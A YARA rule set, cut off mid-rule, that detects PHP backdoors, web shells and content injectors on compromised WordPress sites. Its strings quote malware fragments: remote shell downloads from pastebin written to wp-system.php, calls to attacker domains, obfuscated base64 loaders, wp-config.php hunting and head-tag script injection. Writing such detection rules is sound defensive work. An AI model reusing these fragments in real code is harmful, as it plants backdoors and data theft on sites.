/*
   Yara Rule Set
   Author: Brian Laskowski
   Date: 2019-12-22
   Identifier: work1
   Reference: https://github.com/Hestat/lw-yara/
   Reference malware samples: https://github.com/NavyTitanium/Misc-Malwares/tree/master/PHP 
*/

/* Rule Set ----------------------------------------------------------------- */

rule backdoor_countyu {
   meta:
      description = "work1 - file backdoor_countyu.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2019-12-22"
      hash1 = "a539719a580d96a952b5e81928b0c50d5fac7c35f84ca83a143c929f67c1806b"
   strings:
      $s1 = "$mb4a88417b3d0170d = file_get_contents(base64_decode($v634894f9845d8dc65).$kkk557);" fullword ascii
      $s2 = "curl_setopt($kd88fc6edf21ea464, CURLOPT_USERAGENT, base64_decode('bmV3cmVxdWVzdA=='));" fullword ascii
      $s3 = "$ke4e46deb7f9cc58c = json_decode(base64_decode(fread($se1260894f59eeae9, filesize($s8c7dd922ad47494f))) , 1);" fullword ascii
      $s4 = "$ye617ef6974faced4 = base64_decode('aHR0cDovLw==') . $ke4e46deb7f9cc58c[base64_decode('ZG9tYWlu') ] . $ed6fe1d0be6347b8e;" fullword ascii
      $s5 = "$ye617ef6974faced4 = base64_decode('aHR0cDovLw==') . $m9b207167e5381c47[base64_decode('ZG9tYWlu') ] . $ed6fe1d0be6347b8e;" fullword ascii
      $s6 = "unlink($s8c7dd922ad47494f); $ab4a88417b3d0170f = base64_decode('TG9jYXRpb246IA==') . $ye617ef6974faced4;" fullword ascii
      $s7 = "$d07cc694b9b3fc636 = $h77e8e1445762ae1a - $deaa082fa57816233;" fullword ascii
      $s8 = "$mb4a88417b3d0170d = curl_exec($kd88fc6edf21ea464);" fullword ascii
      $s9 = "curl_setopt($kd88fc6edf21ea464, CURLOPT_URL, base64_decode($v634894f9845d8dc65).$kkk557);" fullword ascii
      $s10 = "$v634894f9845d8dc65 = 'aHR0cDovL3JvaS10cmFmZmljLmljdS9nZXQucGhwP2Y9anNvbiZrZXk9';" fullword ascii
      $s11 = "$h0666f0acdeed38d4 = @fopen($s8c7dd922ad47494f, base64_decode('dys='));" fullword ascii
      $s12 = "$se1260894f59eeae9 = @fopen($s8c7dd922ad47494f, base64_decode('cg=='));" fullword ascii
      $s13 = "$ke4e46deb7f9cc58c = json_decode($mb4a88417b3d0170d, true);" fullword ascii
      $s14 = "$s8c7dd922ad47494f = dirname(__FILE__) . \"/\" . md5($ed6fe1d0be6347b8e);" fullword ascii
      $s15 = "if ($m9b207167e5381c47[base64_decode('ZG9tYWlu') ]) {" fullword ascii
      $s16 = "if ($ke4e46deb7f9cc58c[base64_decode('ZG9tYWlu') ]) {" fullword ascii
      $s17 = "$bb4a88417b3d0170f = strlen($ab4a88417b3d0170f); header(\"Set-Cookie: bb4a88417b3d0170f=$bb4a88417b3d0170f\"); header($ab4a88417" ascii
      $s18 = "$bb4a88417b3d0170f = strlen($ab4a88417b3d0170f); header(\"Set-Cookie: bb4a88417b3d0170f=$bb4a88417b3d0170f\"); header($ab4a88417" ascii
      $s19 = "$m9b207167e5381c47 = v64547f9857d8dc65($s8c7dd922ad47494f);" fullword ascii
      $s20 = "$kkk557 = \"723d60518a520564b23f4de72fd97781\";" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 7KB and
         ( 8 of them )
      ) or ( all of them )
}

rule backdoor_27887b6fb476f7449305ee367b01f779 {
   meta:
      description = "work1 - file backdoor_27887b6fb476f7449305ee367b01f779.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2019-12-22"
      hash1 = "8d00a0154dbf5a9385a546acf852760afe7b44746f4e485da994d7ce0c6f1ca4"
   strings:
      $x1 = "$html=file_get_contents('http://toptivi.com/wp-content/app.php?email='.$emaillls);" fullword ascii
      $x2 = "print \"<pre align=center><form method=post>Password: <input type='password' name='pass'><input type='submit' value='>>'>" fullword ascii
      $s3 = "<script src=\"https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/js/bootstrap.min.js\"></script>" fullword ascii
      $s4 = "<link href=\"https://maxcdn.bootstrapcdn.com/bootswatch/3.3.6/cosmo/bootstrap.min.css\" rel=\"stylesheet\" >" fullword ascii
      $s5 = "* Options are LOGIN (default), PLAIN, NTLM, CRAM-MD5" fullword ascii
      $s6 = "$sendmail = sprintf('%s -oi -f%s -t', escapeshellcmd($this->Sendmail), escapeshellarg($this->Sender));" fullword ascii
      $s7 = "$sendmail = sprintf('%s -f%s', escapeshellcmd($this->Sendmail), escapeshellarg($this->Sender));" fullword ascii
      $s8 = "$privKeyStr = file_get_contents($this->DKIM_private);" fullword ascii
      $s9 = "<li>hello <b>[-emailuser-]</b> -> hello <b>user</b></li>" fullword ascii
      $s10 = "$sendmail = sprintf('%s -oi -t', escapeshellcmd($this->Sendmail));" fullword ascii
      $s11 = "Reciver Email = <b>user@domain.com</b><br>" fullword ascii
      $s12 = "$DKIMb64 = base64_encode(pack('H*', sha1($body))); // Base64 of packed binary SHA-1 hash of body" fullword ascii
      $s13 = "* and creates a plain-text version by converting the HTML." fullword ascii
      $s14 = "* Usually the email address used as the source of the email" fullword ascii
      $s15 = "<li>your code is  <b>[-randommd5-]</b> -> your code is <b>e10adc3949ba59abbe56e057f20f883e</b></li>" fullword ascii
      $s16 = "$password = \"4b7554c77a57531a3baa03dc166addb8\"; // Password " fullword ascii
      $s17 = "print \"<pre align=center><form method=post>Password: <input type='password' name='pass'><input type='submit' value='>>'></form>" ascii
      $s18 = "* PHPMailer only supports some preset message types," fullword ascii
      $s19 = "* @param string $patternselect A selector for the validation pattern to use :" fullword ascii
      $s20 = "<meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\"/>" fullword ascii
   condition:
      ( uint16(0) == 0x3c0a and
         filesize < 400KB and
         ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule backdoor_zzz_2 {
   meta:
      description = "work1 - file backdoor_zzz_2.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2019-12-22"
      hash1 = "56114895e46ae1b71f3d8620e04703892bead737b774446a28e649da3919c1df"
   strings:
      $s1 = "if (file_exists(\"cqenpf76ipf2.php.suspected\")) rename (\"cqenpf76ipf2.php.suspected\", \"cqenpf76ipf2.php\");" fullword ascii
      $s2 = "RewriteRule ^([A-Za-z0-9-]+).html$ cqenpf76ipf2.php?world=5&looping=176&hl=$1 [L]\");" fullword ascii
   condition:
      ( uint16(0) == 0x3c0a and
         filesize < 1KB and
         ( all of them )
      ) or ( all of them )
}

rule backdoor_wp_config {
   meta:
      description = "work1 - file backdoor_wp-config.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2019-12-22"
      hash1 = "5057d290bbf35f7440ce7fa9c30354c8442fa77080f41066530c76d06b242008"
   strings:
      $s1 = "= str_replace('sx', '64', $ee); $algo = 'kolotyska'; $pass = \"Zgc5c4MXrL8kbQBSs88NKfKeflvUNPlfnyDNGK/X/wEfeQ==\";" fullword ascii
      $s2 = "if (fopen(\"$subdira/.$algo\", 'w')) { $ura = 1; $eb = \"$subdira/\"; $hdl = fopen(\"$subdira/.$algo\", 'w'); break; }" fullword ascii
      $s3 = "$data = file_get_contents($url);" fullword ascii
      $s4 = "if (fopen(\"$dira/.$algo\", 'w')) { $ura = 1; $eb = \"$dira/\"; $hdl = fopen(\"$dira/.$algo\", 'w'); break; }" fullword ascii
      $s5 = "if (!$ura && fopen(\".$algo\", 'w')) { $ura = 1; $eb = ''; $hdl = fopen(\".$algo\", 'w'); }" fullword ascii
      $s6 = "define( 'DB_PASSWORD', '' );" fullword ascii
      $s7 = "define( 'SECURE_AUTH_KEY',  '' );" fullword ascii
      $s8 = "/* That's all, stop editing! Happy publishing. */" fullword ascii
      $s9 = "$ea = '_shaesx_'; $ay = 'get_data_ya'; $ae = 'decode'; $ea = str_replace('_sha', 'bas', $ea); $ao = 'wp_cd'; $ee = $ea.$ae; $oa " ascii
      $s10 = "$reqw = $ay($ao($oa(\"$pass\"), 'wp_function'));" fullword ascii
      $s11 = "curl_setopt($ch, CURLOPT_HEADER, 0);" fullword ascii
      $s12 = "require_once( ABSPATH . 'wp-settings.php' );" fullword ascii
      $s13 = "function get_data_ya($url) {" fullword ascii
      $s14 = "define( 'DB_HOST', 'localhost' );" fullword ascii
      $s15 = "$ea = '_shaesx_'; $ay = 'get_data_ya'; $ae = 'decode'; $ea = str_replace('_sha', 'bas', $ea); $ao = 'wp_cd'; $ee = $ea.$ae; $oa " ascii
      $s16 = "define( 'LOGGED_IN_KEY',    '' );" fullword ascii
      $s17 = "@ini_set('display_errors', '0');" fullword ascii
      $s18 = "define( 'SECURE_AUTH_SALT', '' );" fullword ascii
   condition:
      ( uint16(0) == 0x3c0a and
         filesize < 10KB and
         ( 8 of them )
      ) or ( all of them )
}

rule backdoor_wp_main {
   meta:
      description = "work1 - file backdoor_wp-main.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2019-12-22"
      hash1 = "6269e609deb8dace97457f319f20daddaf50e78767dde684984d9d70f129212b"
   strings:
      $x1 = "<?php error_reporting(E_ERROR|E_WARNING|E_PARSE|E_COMPILE_ERROR);ini_set('display_errors','on');set_time_limit(0);check_commands" ascii
      $s2 = "90cb14);$wny04d597606e0989a6=execute_query(\"UPDATE \".$wid727bb92f57c3951d.\"posts SET post_content = '$kmi72f67a08bb51167e' WH" ascii
      $s3 = "f0f862b0c65d1b8=execute_query(\"INSERT INTO \".$wid727bb92f57c3951d.\"posts (`post_title`, `post_content`, `post_status`, `post_" ascii
      $s4 = "=execute_query(\"SELECT id,guid,post_content FROM \".$wid727bb92f57c3951d.\"posts WHERE id = $drie5a9d8684a8edfed\");$rvu3f0f862" ascii
      $s5 = "8){echo\"Failed to execute query ($eipe0af5865757b3f2a): \".get_error();die;}return $rvu3f0f862b0c65d1b8;}function get_error(){g" ascii
      $s6 = "05039f7a65);dispatch_exec_commands_for_conf();}function config_parse_insert_post(){list($slz87de66479aea0306,$sto2040a28d572e088" ascii
      $s7 = "'login',$lgc518fd46dddb3f97e[array_rand($lgc518fd46dddb3f97e)]);return $vgta455620d6612d981->$ovpbbf2466e744a5003;}function get_" ascii
      $s8 = "6df5bde;global $wid727bb92f57c3951d;$rvu3f0f862b0c65d1b8=execute_query(\"SELECT id FROM \".$wid727bb92f57c3951d.\"posts WHERE po" ascii
      $s9 = "a93a176df5bde;}function get_first_post_id(){global $wid727bb92f57c3951d;$rvu3f0f862b0c65d1b8=execute_query(\"SELECT id FROM \".$" ascii
      $s10 = "atch_exec_commands_for_conf(){if(array_key_exists('first',$_REQUEST)){get_posts_count();$gsc3caa85db42b2089e=get_first_post_id()" ascii
      $s11 = "<?php error_reporting(E_ERROR|E_WARNING|E_PARSE|E_COMPILE_ERROR);ini_set('display_errors','on');set_time_limit(0);check_commands" ascii
      $s12 = "nect_using_parse_config($rao5b668e57ec706744){global $wid727bb92f57c3951d;$ibua1a4b0b8357dda28=file_get_contents($rao5b668e57ec7" ascii
      $s13 = "c3951d=$bqo9b80b13ee7aa2867;$gkn531a93a176df5bde=db_connect(DB_HOST,DB_USER,DB_PASSWORD,DB_NAME,'require');return $gkn531a93a176" ascii
      $s14 = "7016 password: $jwp8db64bce186cbad8 name: $lewfb507393460e685e method_name: $cluc49cf36844cf3448#\\n\";if(is_mysqli()){$rij1b9aa" ascii
      $s15 = "){print\"#Next id: $mrbefabc30264bfc793#\\n\";}else{print\"#No next id#\\n\";}}function check_commands(){if(array_key_exists('de" ascii
      $s16 = "nk')){print\"#loaded wp-load#\\n\";wp_load_insert_post();}else{print\"#Failed to load wp-load, trying to parse config directly#" ascii
      $s17 = "conf_path(){return get_file_path('wp-config.php');}function get_load_path(){return get_file_path('wp-load.php');}function get_fi" ascii
      $s18 = "a3ff8e5c2997);echo\"#Failed: $utx019af902730a88c4#\\n\";}}?>" fullword ascii
      $s19 = "ts_count(){global $wid727bb92f57c3951d;echo\"#wp_prefix: $wid727bb92f57c3951d#\\n\";$rvu3f0f862b0c65d1b8=execute_query(\"SELECT " ascii
      $s20 = "3['pinged'].\"','\".$axnab690da061c9b963['post_content_filtered'].\"')\");return $gkn531a93a176df5bde->$unn8916879d1cfb675c;}fun" ascii
   condition:
      ( uint16(0) == 0x3c0a and
         filesize < 40KB and
         ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule backdoor_wp_load {
   meta:
      description = "work1 - file backdoor_wp-load.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2019-12-22"
      hash1 = "527fdc5e4dc719fc97f61aa85b9edc33e90d9fd2ed3dbcda30ce25f4e1d5c908"
   strings:
      $s1 = "= str_replace('sx', '64', $ee); $algo = 'kolotyska'; $pass = \"Zgc5c4MXrL8kbQBSs88NKfKeflvUNPlfnyDNGK/X/wEfeQ==\";" fullword ascii
      $s2 = "if (fopen(\"$subdira/.$algo\", 'w')) { $ura = 1; $eb = \"$subdira/\"; $hdl = fopen(\"$subdira/.$algo\", 'w'); break; }" fullword ascii
      $s3 = "$data = file_get_contents($url);" fullword ascii
      $s4 = "if (fopen(\"$dira/.$algo\", 'w')) { $ura = 1; $eb = \"$dira/\"; $hdl = fopen(\"$dira/.$algo\", 'w'); break; }" fullword ascii
      $s5 = "if (!$ura && fopen(\".$algo\", 'w')) { $ura = 1; $eb = ''; $hdl = fopen(\".$algo\", 'w'); }" fullword ascii
      $s6 = "$ea = '_shaesx_'; $ay = 'get_data_ya'; $ae = 'decode'; $ea = str_replace('_sha', 'bas', $ea); $ao = 'wp_cd'; $ee = $ea.$ae; $oa " ascii
      $s7 = "$reqw = $ay($ao($oa(\"$pass\"), 'wp_function'));" fullword ascii
      $s8 = "curl_setopt($ch, CURLOPT_HEADER, 0);" fullword ascii
      $s9 = "function get_data_ya($url) {" fullword ascii
      $s10 = "$ea = '_shaesx_'; $ay = 'get_data_ya'; $ae = 'decode'; $ea = str_replace('_sha', 'bas', $ea); $ao = 'wp_cd'; $ee = $ea.$ae; $oa " ascii
      $s11 = "@ini_set('display_errors', '0');" fullword ascii
   condition:
      ( uint16(0) == 0x3c0a and
         filesize < 10KB and
         ( 8 of them )
      ) or ( all of them )
}

rule backdoor_o9g {
   meta:
      description = "work1 - file backdoor_o9g.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2019-12-22"
      hash1 = "1bbe577ace2c701cad8617f94aac5723f929a21d9d703d64f108934dc97ccd8e"
   strings:
      $s1 = "9nWowmdq+1bZOfNUrtsNot+QHK8q+zHVFYDno6zPcrzO4arJ77kThps5PhFP9LR+mu/LaHuwz9aO3avxs2T3g65417hqc4XqbZGkrQf4LOgPYHNYDMZ8R0vU1TdoSyxA" ascii
      $s2 = "echo                                                                                                               " fullword ascii
      $s3 = "$__=                                                              'base64_decode'                           ;  " fullword ascii
      $s4 = "$__________=$__________________('$_',$______________);                                                                  " fullword ascii
      $s5 = "$_____='    b2JfZW5kX2NsZWFu';                                                                                          " fullword ascii
      $s6 = "5Offk7/++/dHXi+8e8+Lf8s7/PsX/P/L/8u6zUb+X798/rv975dznP79bBIpSv/79/8PuOX90w==';" fullword ascii
      $s7 = "A9tR6iNmkzWYva/COmN90AGzs1aSWGsxZyI5z1aieSx4hvEQ9/DCcy/9lNYLzwk+0H2WB1vO8UjoNsmjIbKHzAORmTRv4hJemX12FnQv0RKsZJ78zpSxG3k+bgV82fm7" ascii
      $s8 = "xwszuFc+tDGykz4bxpxP4O52ER5D0WSB6X7TtzieEcCzBZi7J4SFhXEcmdG7MU3ubQDezayFf0NbS32XzbEDvIs/Ed6S4BbnpBu/BAxQPeDnK7xvzHgxRrzAmF+g3zb+" ascii
      $s9 = "jL+I051je0GfQXkrpLJh9doPCzRUnrvo8JrjF2X/zmnjd+H6fKzkA/NmTV+vjtMCuaNOdBNkaaRfG6uF79qM1DHMZ7M43lf9bLyUvw6eUfYAT5CWTj8A2LWTY+uYioL9" ascii
      $s10 = "3o1+XWs64oKg4P94kI81r+WiJPGnQ97GQ/p0BW8KftY8gpwk+usd/uOCLeQurY3bemS9VPihrunVFf3e4GFVOuQNv1EGy5nPzOZUdjw8hqADHH3gS75EYogXvlavkLuW" ascii
      $s11 = "$____='b2JfZ2V0X2NvbnRlbnRz';                                                                               " fullword ascii
      $s12 = "$___();$__________($______($__($_))); $________=$____();" fullword ascii
   condition:
      ( uint16(0) == 0x3c0a and
         filesize < 70KB and
         ( 8 of them )
      ) or ( all of them )
}

rule content_injector_layer_4_deobfuscated {
   meta:
      description = "work1 - file content-injector_layer-4-deobfuscated.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2019-12-22"
      hash1 = "e2228fd80e18aa730f6180c3b70fde47218be6953b1bda1b42d8f8e0b0a7e380"
   strings:
      $s1 = "@setcookie($key, $value_and_ttl[0], time() + $value_and_ttl[0], \"/\", $_SERVER['HTTP_HOST']);" fullword ascii
      $s2 = "if (isset($content[\"options\"][\"type\"]) && $content[\"options\"][\"type\"]==\"inject\")" fullword ascii
      $s3 = "$content = str_replace(\"</head>\", $js_code . \"\\n\" . \"</head>\", $content);" fullword ascii
      $s4 = "foreach ($content[\"headers\"] as $key => $value)" fullword ascii
      $s5 = "$config = 'cTQ9JmsnKnF0KTprLjcoNTAtbihpMHR3Z35xNj4qMmV8cHJtMmFhfkVzaS4gNWYsem1sNShjZyF3PmpkeCotLzgFdixuLyVyJDZsKzZqKnptfiBye" fullword ascii
      $s6 = "$this->config_dict = @unserialize($this->_decrypt(TdsClient::b64d($this->config), \"tmnyrbtvchx5bny\"));" fullword ascii
      $s7 = "foreach (array_merge($_COOKIE, $_POST) as $data_key => $data)" fullword ascii
      $s8 = "foreach ($content[\"cookies\"] as $key => $value_and_ttl)" fullword ascii
      $s9 = "$GLOBALS['injectable_js_code'] = TdsClient::b64d($content[\"data\"]);" fullword ascii
      $s10 = "$context['http']['header'] = 'Content-type: application/x-www-form-urlencoded';" fullword ascii
      $s11 = "if (strpos(strtolower($content), \"</head>\") !== FALSE)" fullword ascii
      $s12 = "private function _http_query_native($url, $content)" fullword ascii
      $s13 = "private function _http_query_curl($url, $content)" fullword ascii
      $s14 = "return @file_get_contents($url, FALSE, $context);" fullword ascii
      $s15 = "public function try_process_check_request()" fullword ascii
      $s16 = "if ($client->try_process_check_request())" fullword ascii
      $s17 = "$query['u'] = @$_SERVER['HTTP_USER_AGENT'];" fullword ascii
      $s18 = "$query['p'] = @$_SERVER['HTTP_HOST'] . @$_SERVER['REQUEST_URI'];" fullword ascii
      $s19 = "public function process_request()" fullword ascii
      $s20 = "$js_code = $GLOBALS['injectable_js_code'];" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 30KB and
         ( 8 of them )
      ) or ( all of them )
}

rule backdoor__51c46b7a {
   meta:
      description = "work1 - file backdoor_.51c46b7a.ico"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2019-12-22"
      hash1 = "205577f5011abfaf96d67e673023cb903ad8652b4d6f14ab8eb3fc4c232befd3"
   strings:
      $s1 = "$_cw847 = basename/*3*/(/*vts*/trim/*ic9j*/(/*9j*/preg_replace/*tb*/(/*3kqw*/rawurldecode/*ts1*/(/*sv4oc*/\"%2F%5C%28.%2A%24%2F" ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 300KB and
         ( all of them )
      ) or ( all of them )
}

rule shell1_work1_exdir {
   meta:
      description = "work1 - file exdir.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2019-12-22"
      hash1 = "73910102658eb6291d811d64c3d83cbca948e06050b5bf6c4b8697a115efd6f9"
   strings:
      $x1 = "$shell = file_get_contents('https://pastebin.com/raw/hpqEekGT'); //" fullword ascii
      $s2 = "file_put_contents('wp-system.php',$shell);  //" fullword ascii
      $s3 = "$base = file_get_contents('base');" fullword ascii
      $s4 = "$admin = file_get_contents('admin');" fullword ascii
      $s5 = "$user = posix_getpwuid(posix_getuid());" fullword ascii
      $s6 = "$result=fopen('result.txt','w');" fullword ascii
      $s7 = "copy($file,($i+1).'.txt');" fullword ascii
      $s8 = "$find = 'wp-config.php';" fullword ascii
      $s9 = "$new='wp-system.php';" fullword ascii
      $s10 = "$result = findFilesFromDirectory($finalPath, $files, $find);" fullword ascii
      $s11 = "function findFilesFromDirectory($path, &$files, $find) {" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 3KB and
         ( 1 of ($x*) and all of them )
      ) or ( all of them )
}

rule infected_12_22_19_shell1_work1_ex {
   meta:
      description = "work1 - file ex.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2019-12-22"
      hash1 = "11cc1ce74623cca92b70a0992dfe908126e4a9a82243db110ea0f810ad474d82"
   strings:
      $x1 = "$shell = file_get_contents('https://pastebin.com/raw/hpqEekGT'); //" fullword ascii
      $s2 = "$base = file_get_contents('https://pastebin.com/raw/kHL0XPea');" fullword ascii
      $s3 = "file_put_contents('wp-system.php',$shell);  //" fullword ascii
      $s4 = "$user = posix_getpwuid(posix_getuid());" fullword ascii
      $s5 = "$result=fopen('result.txt','w');" fullword ascii
      $s6 = "copy($file,($i+1).'.txt');" fullword ascii
      $s7 = "$find = 'wp-config.php';" fullword ascii
      $s8 = "$new='wp-system.php';" fullword ascii
      $s9 = "$result = findFilesFromDirectory($finalPath, $files, $find);" fullword ascii
      $s10 = "function findFilesFromDirectory($path, &$files, $find) {" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 3KB and
         ( 1 of ($x*) and all of them )
      ) or ( all of them )
}

rule backdoor_mod_x {
   meta:
      description = "work1 - file backdoor_mod_x.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2019-12-22"
      hash1 = "2ebab963b4bdb879246e07c3fdcd5b4f1f78ca1a7cbd277d55f2732fbe4c9959"
   strings:
      $s1 = "$w = $v(\"/*iXedVoqe2988*/\", $xsqPYkUn667( jr_Uz($xsqPYkUn667($qosNeVMz3605), \"NSRvfrEi5875\")));" fullword ascii
      $s2 = "$XODAtKds5345 = \"8swkd9hm_1(na;xv07uoi4bg*63)eqz2f.jlp/rc5yt\";" fullword ascii
      $s3 = "FF2E1GSw6FwZUYHpBHj0AQwU1EBl2YER+DQI5PCUlCwFWCmJSBGFjQwVBAxp/Qlh+DQI5PCUjKRlvUVBSBBsAGQcqCB1lVU9FLD4hETYhByhXYFtPLQQqED9AfBxXVWF" ascii
      $s4 = "BBGJiBi0hB152X1x/GGIcJgVAE1lsCg5DL2E+Gi01dAJ7a1BeFmIcMDMeHy9gVERbHRUAIzM0fCBhCXlgBGJiBiobIQFUVXEBBColEQI6D1hva1wCDTQ5PARADw9WC2V" ascii
      $s5 = "dFD0EAz9BFxlXCgJTFAs6BgVBFxN+e1NdLWEcBgcmDwZvYFBbBQA5EQNAH1hXVXkFLwRrAy81AxNsCltFAz46GgMxIgJWe1sCBBsbTywLJl5vVQ5MBRAABjYmBF5/f1w" ascii
      $s6 = "ZFwQhQSUVLiN2aVtfFwscGi8xIR5vC3lNLBAxQCUVLiN2aVx/LT4ERgIqDxx8e2UFLxQ+DComcBBvYHpSHgAQNwU1IQ9WYGFZLT05GSw6FwZUYHpBHj4qBgQfNhp/cHk" ascii
      $s7 = "eLGA2DComABB7bHJbAhATGDVCfCN6ewZmBColESxCMTlmbFBBGAAxBS8xIQNWfFAHADoxBikFKiN/fw5CKhVrHAc1AxBWCmEFLSoTTy8xJgd6T1h/FD5rDzwlAwNUe1B" ascii
      $s8 = "ZLD42RgcxdRF6T0cMDTklAAVACxBUYHUFHjobQSUVKQVsCl9DBxAxTgc2AEJkCg5ALWFrBTwmMh9UfHIeHhQABgIbBwNXf3FPLSljHARAcFlvbwIFHjkqGwRBDx18fwJ" ascii
      $s9 = "/DQI+HwUfEwFUQkR+DQI5PCUlCwFWCmJSBGAQGAVBAxp/Qlh+DQI5PCUjKRBvYGUELT5mESw6FwZUYHpBHj0YGgULBFB8e2UFLxQ+DComcBFRb2FMKwA1HzNCEyRnbXl" ascii
      $s10 = "/BBsQGgUfdBN8fAdSAxchPSUjLiN2b21DLTo1HQcmdBNRcH1GFARmGSw0fDhhCXlgGSo2ASsLIQ1+awdNASoABjYYdR56QQdBBBQ5BiUVLiN2aVx/BBsQGgUfdBN8e0Q" ascii
      $s11 = "FKgsYAy81HwFXcHlZASQ9PCUqdSJ2aVtYKgRnHAI1KR9XUXVPFAQqGj9BFwJsUVBeFBQbBi86NiJ2aVx/LWA2BgI1CwZ+e2UFLxQ+DComcFlQYHVZBQI+QSUVLiN2aVt" ascii
      $s12 = "hGBUhGAU2AAdta1xSAjoTGD4xJhpXVmFGLBAqRgc1KRN5VXlaLARrHSocHwFXcGFZBQcmDzwqF1hWVQNSFD4UBQVAEF58UgMNLwRnAQIqFA5RcFtCFAdjRjwqLVl8fwJ" ascii
      $s13 = "SBxATES81KQR+e2VaFAQUHS0hB152UXZSBxATES8xBA58e3ZSBxATES8xBA58e3ZSBxATES8xBA58e3ZeLWAUBS8xcVB8e1N/Gj8cMDMeFA5mbQJgGioQESwLcQJRf3F" ascii
      $s14 = "/DQI+HwUfEwFUQkR+DQI5PCUlCwFWCmJSBGAQGAVBAxp/Qlh+DQI5PCUjKRBvYGUELT5mESw6FwZUYHpBHj0YGgULBFB8e2UFLxQ+DComcBFRb2FMKwA1HwVAExpvb3k" ascii
      $s15 = "/DQI5PCUjLgJtCXVlG2IAFCxBBBB/CQdSHgATGDNCEyRnbXlgBxA9ETQeDzlha3ZbAjoAEDM3fD1jfkRbLRcbGD4hcQd8fU9/GgY+Iy82CB58fQ5yHD8cMDAxBAd5UVB" ascii
      $s16 = "PKhsfGSxAdFxWC3FGFmE2GgI0fANXf1tZLD0AEAclcARXQVRFBQI9PCUhF1lvbwZCGWJiETYhBABhYFthLQQlES0xDBxXYFtPLQQqEDxAE1ltCnlGLwQEAwI0fBlXVW1" ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 300KB and
         ( 8 of them )
      ) or ( all of them )
}

rule backdoor_unknown {
   meta:
      description = "work1 - file backdoor_unknown.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2019-12-22"
      hash1 = "291ff52840c65884ef97436f2ae472228f08240f0569f6bcc45d6e2b026b190f"
   strings:
      $x1 = "else $ttxt = get_data_yo(\"http://ferm2018all.com/lnk/gen/index.php?key=$tkey&g=$group&lang=$lang&page=$page&cldw=$cl" fullword ascii
      $x2 = "$desc = get_data_yo(\"http://ferm2018all.com//lnk/gen/desc.php?key=$tkey&desc=$group\");" fullword ascii
      $s3 = "$twork = file_get_contents('http://ferm2018all.com/lnk/up/sh.txt');" fullword ascii
      $s4 = "$clkeys = get_data_yo(\"http://ferm2018all.com/lnk/gen/keys/$kgroup.keys\");" fullword ascii
      $s5 = "$ll = get_data_yo(\"http://ferm2018all.com/lnk/tuktuk.php?d=$donor&cldw=$cldw&dgrp=$algo\");" fullword ascii
      $s6 = "$fbots = get_data_yo(\"http://ferm2018all.com/lnk/bots.dat\");" fullword ascii
      $s7 = "$my_content = str_replace('</head>', \"<meta name=\\\"description\\\" content=\\\"$desc\\\">" fullword ascii
      $s8 = "$gtxt = file_get_contents(\"{$eb}{$st}/$page.txt\");" fullword ascii
      $s9 = "if ($cldw) file_put_contents(\"{$eb}{$st}/cldwmap.txt\", $newcllink, FILE_APPEND);" fullword ascii
      $s10 = ">$rating-5</span> stars based on\\n<span itemprop=\\\"reviewCount\\\">$rcount</span> reviews\\n</div>\\n</div>\\n\";" fullword ascii
      $s11 = "else $ttxt = get_data_yo(\"http://ferm2018all.com/lnk/gen/index.php?key=$tkey&g=$group&lang=$lang&page=$page&cldw=$cldw&dd=$ddom" ascii
      $s12 = "$my_content = preg_replace('#<div class=\"post-content\">(.*)</div>#iUs', \"<div>\\n$txt\\n</div>\", $my_content, " fullword ascii
      $s13 = "if (file_put_contents(\"{$eb}xml.php\", $twork)) echo \"success!<br><a href=/{$eb}xml.php>go</a>\";" fullword ascii
      $s14 = "file_put_contents(\"{$eb}{$st}/$page.txt\", \"$title|$desc|$txt|$h1\");" fullword ascii
      $s15 = "$my_content = preg_replace('#<div class=\"post-content\">(.*)</div>#iUs', \"<div>\\n$txt\\n</div>\", $my_content, 1);" fullword ascii
      $s16 = "$my_content = preg_replace(\"#<meta name=[\\\"\\']{1}description(.*)\\>#iUs\", '', $my_content);" fullword ascii
      $s17 = "$my_content = preg_replace(\"#<meta name=[\\\"\\']{1}keywords(.*)\\>#iUs\", '', $my_content);" fullword ascii
      $s18 = "elseif (!preg_match('#<title>(.*)404(.*)#i', $my_content) && !preg_match('#<title>(.*)not found(.*)#i', $my_content)) {" fullword ascii
      $s19 = "$my_content = preg_replace('#<div id=\"entry-content\">(.*)</div>#iUs', \"<div>\\n$txt\\n</div>\", $my_content, 1)" fullword ascii
      $s20 = "$my_content = preg_replace('#<div id=\"main-content\">(.*)</div>#iUs', \"<div>\\n$txt\\n</div>\", $my_content, 1);" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 50KB and
         ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule mailer_wenche {
   meta:
      description = "work1 - file mailer_wenche.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2019-12-22"
      hash1 = "d70e877c611771ca1939f1863bb268abc96b364ee1024f0e9176e80ce4d5bfc9"
   strings:
